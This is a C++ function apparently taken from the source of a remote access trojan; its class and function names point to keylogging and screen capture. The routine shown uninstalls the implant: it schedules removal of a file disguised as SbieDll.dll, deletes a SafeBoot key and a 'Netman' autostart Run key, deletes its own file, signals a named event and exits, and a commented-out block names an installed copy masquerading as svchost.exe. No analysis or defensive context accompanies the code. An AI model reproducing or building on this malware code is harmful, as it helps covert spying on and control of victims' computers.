void CKernelManager::UnInstallService()
{

	char	strRandomFile[MAX_PATH];
	char	szTempPath[MAX_PATH];
	GetTempPathA(MAX_PATH,szTempPath);
	wsprintf(strRandomFile, "%s%d.bak",szTempPath, GetTickCount());
	
	//删除注册表




	//取得的目录结尾不带斜杠
	CHAR szWindowsPath[MAX_PATH] = {0};
	GetWindowsDirectoryA(szWindowsPath, MAX_PATH * sizeof(CHAR));
	strcat(szWindowsPath,"\\meed\\SbieDll.dll.bak");
	MoveFileEx(szWindowsPath,strRandomFile,MOVEFILE_DELAY_UNTIL_REBOOT);


	//停止插件工作
	StopAutoScreen();


// 	//安装后的目标文件
// 	CHAR szObjInstallName[MAX_PATH] = {0};
// 	wsprintfA(szObjInstallName, "%s\\%s", szWindowsPath, "meed\\svchost.exe");
// 
// 	CKeyboardManager::MyMoveFile(szObjInstallName, strRandomFile);

	RegDeleteKey(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\option");
	RegDeleteKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Microsoft\\Windows\\CurrentVersion\\Run\\Netman");

	DelSelfFile();

	HANDLE hEvent=OpenEvent(EVENT_ALL_ACCESS,FALSE,TEXT("nimdkeikd"));
	if (hEvent)
	{
		SetEvent(hEvent);
		CloseHandle(hEvent);
		Sleep(2000);
	}

	ExitProcess(0);

}